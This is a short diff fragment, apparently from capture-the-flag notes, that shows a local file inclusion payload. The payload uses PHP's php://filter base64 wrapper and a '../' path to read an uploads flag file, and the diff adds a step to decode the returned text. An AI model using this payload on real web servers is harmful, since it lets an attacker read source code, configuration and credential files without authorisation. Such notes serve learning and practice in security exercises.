@@ -9,3 +9,5 @@
 
 /?page=php://filter/convert.base64-encode/resource=../uploads/flag
 	success
+	
+finally, decode the returned text.
